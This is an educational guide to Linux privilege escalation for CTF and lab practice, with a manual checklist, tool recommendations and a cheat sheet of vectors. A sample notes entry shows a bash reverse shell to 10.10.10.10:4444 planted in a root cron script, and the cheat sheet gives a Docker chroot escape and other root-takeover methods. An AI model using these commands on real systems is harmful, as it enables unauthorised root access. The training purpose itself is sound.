# 🧠 Privilege Escalation – A Practical Guide

First off: **you're not bad at privilege escalation**. It's genuinely the hardest phase for most people because it requires:

1. **Deep system knowledge** (Linux/Windows internals)
2. **Pattern recognition** (knowing what to look for)
3. **Creative thinking** (connecting seemingly unrelated dots)

Enumeration is mostly **mechanical** – run tools, read outputs, identify services. Exploitation is often **copy-paste** – find a vulnerability, run the exploit. But privilege escalation is **detective work**. You're building a case against the system.

Let's break this down into actionable steps.

---

## 🎯 Why You Might Be Struggling

| Reason | Why It Hurts | The Fix |
|--------|--------------|---------|
| **You don't know what to look for** | You run LinPEAS/WinPEAS, get 500 lines of output, and freeze. | Learn the **top 5 things** to check manually first. Then let tools fill the gaps. |
| **You haven't built muscle memory** | You don't know what "normal" looks like, so you can't spot "abnormal." | Practice on **intentionally misconfigured** machines (TryHackMe has many). |
| **You're looking for a single silver bullet** | You expect one command to give you root. It's usually **chaining multiple misconfigurations**. | Think in steps: "This cron job runs as root. I can write to its script. I can make it run my reverse shell." |
| **You don't understand the underlying mechanisms** | You run `sudo -l` but don't know what to do with the results. | Learn what each privilege escalation vector actually is (SUID, sudo, cron, capabilities, etc.). |

---

## 📋 Actionable Steps to Get Comfortable

### Phase 1: Build a Mental Model (The "PrivEsc Checklist")

Memorize **exactly 7 things** to check on every Linux box. This is your **manual baseline** before running any automation:

1. **Who am I?** – `id`, `whoami`, `groups`
2. **What can I run with sudo?** – `sudo -l`
3. **What SUID/GUID binaries exist?** – `find / -perm -4000 -type f 2>/dev/null`
4. **What cron jobs are running?** – `cat /etc/crontab`, `ls -la /etc/cron*`
5. **What's world-writable?** – `find / -writable -type f 2>/dev/null | head -20`
6. **What's in /home/ and /root/ (if accessible)?** – hidden files, SSH keys, bash history
7. **What kernel version?** – `uname -a` (check for known exploits)

**Do this manually on every box.** It builds pattern recognition.

---

### Phase 2: Practice the "Staircase Method"

Don't jump straight to root. Think of privilege escalation as climbing stairs:

```
Step 1: Initial access (www-data, low user)
Step 2: Find user-level misconfigurations (sudo -l, SUID)
Step 3: Get to another user (e.g., service account)
Step 4: Find system-level misconfigurations (cron, kernel)
Step 5: Root
```

**Why this matters:** You don't always go from user→root in one step. Sometimes you need to pivot through multiple users. Practice this mindset.

---

### Phase 3: Use the Right Tools (But Understand What They Do)

| Tool | What It Does | When to Use |
|------|--------------|-------------|
| **LinPEAS** | Comprehensive Linux enumeration (colorized, highlights) | After manual checks |
| **WinPEAS** | Same for Windows | After manual checks |
| **PSPy** | Monitor running processes in real-time | When you suspect cron jobs |
| **LSE (Linux Smart Enumeration)** | Less noisy than LinPEAS | When you want cleaner output |
| **GTFOBins** | Tells you which binaries can be abused for privilege escalation | When you find SUID/sudo binaries |

**Golden Rule:** Run LinPEAS, but don't trust it blindly. It will give false positives. Cross-check with your manual findings.

---

### Phase 4: Practice on Purpose-Built Machines

**TryHackMe Rooms (in order of difficulty):**

1. **Linux PrivEsc** (room: `linuxprivesc`) – Step-by-step walkthrough of common vectors.
2. **Linux PrivEsc Arena** – Practice on a single target.
3. **Privilege Escalation (LPE) Practice** – Multiple machines.
4. **Agent Sudo** – Good mix of exploitation + priv esc.

**Hack The Box (start with Easy boxes that have clear priv esc paths):**
- **Lame** – Classic, well-documented.
- **Nibbles** – Simple.
- **Blue** – Windows, but great for learning.

---

### Phase 5: Document Every Single Step

When you practice, write down:

```markdown
## Privilege Escalation Attempt #X

### Current user: www-data
### What I checked:
- sudo -l → nothing
- SUID → `/usr/bin/pkexec` present
- Cron → `/etc/cron.daily/backup.sh` is writable by www-data

### What I did:
1. Edited backup.sh to include: `bash -c 'bash -i >& /dev/tcp/10.10.10.10/4444 0>&1'`
2. Waited for cron to run (2 mins)
3. Got reverse shell as root

### What I learned:
- Cron jobs that run as root and are writable = easy win.
- Always check `/etc/cron.d/` too, not just crontab.
```

This creates a **personal knowledge base** you can reference.

---

## 🧰 Common Linux Privilege Escalation Vectors (Cheat Sheet)

| Vector | How It Works | How to Check | How to Exploit |
|--------|--------------|--------------|----------------|
| **SUID Binaries** | Binary runs with owner's permissions (often root) | `find / -perm -4000 -type f` | Check GTFOBins for exploit |
| **Sudo Misconfigs** | You can run certain commands as root | `sudo -l` | `sudo [command]` or GTFOBins |
| **Writable Cron Jobs** | Cron script runs as root and is writable | `cat /etc/crontab` | Inject reverse shell |
| **Kernel Exploits** | Old kernel has known privilege escalation vulns | `uname -a` | Search Exploit-DB |
| **Writable /etc/passwd** | You can add a root user | `ls -la /etc/passwd` | `openssl passwd` → add user |
| **Docker Group** | User is in docker group | `groups` | `docker run -it -v /:/host alpine chroot /host /bin/bash` |
| **Capabilities** | Binary has root-level capabilities | `getcap -r /` | Check GTFOBins |
| **SSH Keys** | Found in /home/user/.ssh/ | `find /home -name "id_rsa"` | Use key to SSH as that user |
| **NFS Misconfigs** | NFS share exported with no_root_squash | `showmount -e localhost` | Mount, create SUID binary |

---

## 🚀 Immediate Next Steps for You

1. **Do the Linux PrivEsc room on TryHackMe** – literally today. It's a walkthrough, so you'll see every vector in action.

2. **Practice one vector at a time** – Don't try to learn everything at once. This week: SUID. Next week: Sudo. Week after: Cron.

3. **Use GTFOBins** – Bookmark it. Every time you find a SUID binary or sudo command, check it on GTFOBins.

4. **Write your own cheat sheet** – In your own words, explain each vector. If you can't explain it, you don't understand it.

5. **Watch IppSec's HTB walkthroughs** – He's excellent at explaining his thought process for privilege escalation. Pay attention to his **reasoning**, not just his commands.

6. **Don't feel bad about using hints** – In CTFs, hints are learning tools. Use them, understand why it worked, then try another box without hints.

7. **Practice, practice, practice** – It took me about 20-30 boxes before privilege escalation "clicked." Be patient.

---

## 🔥 The Mindset Shift

Right now, you're thinking: *"I need to find the right command to run."*

Shift to: *"I need to understand how this system is misconfigured."*

- **Run LinPEAS** → see a suspicious SUID binary
- **Check GTFOBins** → see how to abuse it
- **Test it** → works? Great. Doesn't work? Move to next finding.
- **Document** → you'll remember it for next time.

**Privilege escalation is a checklist with 10-15 items. Master the checklist.**

---

## 📚 Recommended Resources

| Resource | What It Covers |
|----------|----------------|
| [GTFOBins](https://gtfobins.github.io/) | Abusing Linux binaries |
| [PayloadsAllTheThings - Linux PrivEsc](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md) | Comprehensive reference |
| [LinPEAS](https://github.com/peass-ng/PEASS-ng/tree/master/linPEAS) | Automation tool |
| [Linux PrivEsc Room (THM)](https://tryhackme.com/room/linuxprivesc) | Step-by-step walkthrough |
| [HackTricks - Linux PrivEsc](https://book.hacktricks.xyz/linux-hardening/linux-privilege-escalation-checklist) | Detailed checklist |

---

## 🎯 Final Words

You're **not bad** at privilege escalation – you're **new to it**. There's a difference. Enumeration and exploitation are **linear**; privilege escalation is **non-linear**. It requires a different kind of thinking.

**The secret:** After you've done it 10-15 times, you start recognizing patterns. "Oh, this is like that box where I used the cron job." "Oh, this SUID binary is the same one from last week."

**You will get it.** Just keep practicing.

Now go do the Linux PrivEsc room on TryHackMe. Come back when you have questions. 🚀